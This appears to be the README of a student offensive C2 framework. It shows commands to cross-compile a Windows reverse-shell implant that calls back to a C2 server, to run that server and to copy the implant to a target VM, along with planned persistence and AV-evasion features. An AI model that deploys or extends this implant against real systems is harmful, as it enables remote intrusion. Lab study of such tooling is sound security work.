# s0P0wn3d — Offensive C2 Framework

**VIROLOGY Project** | Educational use only — authorized lab environments.

## Status

| Phase | Feature | Status |
|-------|---------|--------|
| 1 | Reverse shell | ✅ Working |
| 1 | C2 server (Python) | ✅ Working |
| 2 | AES-256-CBC encryption | 🔄 In progress |
| 2 | RSA key exchange | 📋 Planned |
| 2 | Persistence (Registry) | 📋 Planned |
| 3 | AV evasion | 📋 Planned |

## Quick Start

### Build Implant (cross-compile from Linux)

```bash
cd src/implant/core
make cross C2_IP=192.168.56.104 C2_PORT=4444
```

### Run C2 Server

```bash
cd src/controller/server
source ~/c2server/venv/bin/activate
python3 c2_server.py
```

### Deploy

```bash
# Copy implant to target (Windows VM)
scp src/implant/core/implant.exe user@target:~/Desktop/

# Execute on target → shell appears in C2 server
```

## Architecture

```
Implant (Windows target)
    │
    │  TCP:4444 (plaintext — Phase 1)
    │  AES-256-CBC (Phase 2)
    ▼
C2 Server (Linux/Python)
    │
    ▼
Attacker CLI
```

## Lab Environment

| Machine | OS | IP | Role |
|---------|----|----|------|
| C2 Server | Ubuntu 24.04 | 192.168.56.104 | Attacker |
| Target | Windows 10 21H2 | 192.168.56.101 | Victim |

Network: VirtualBox Host-Only (192.168.56.0/24)

## MITRE ATT&CK Mapping

| Feature | Tactic | Technique | ID |
|---------|--------|-----------|-----|
| Reverse shell | Execution | Windows Command Shell | T1059.003 |
| C2 channel | C&C | Application Layer Protocol | T1071.001 |
| Plaintext comms | - | Known weakness | - |

## Known Weaknesses (Phase 1)

- **No encryption** — traffic visible in Wireshark → Phase 2: AES-256-CBC
- **No persistence** — process killed = gone → Phase 2: Registry Run Key
- **No obfuscation** — AV can detect → Phase 3: String obfuscation

---

⚠️ Never use outside of authorized lab environments.
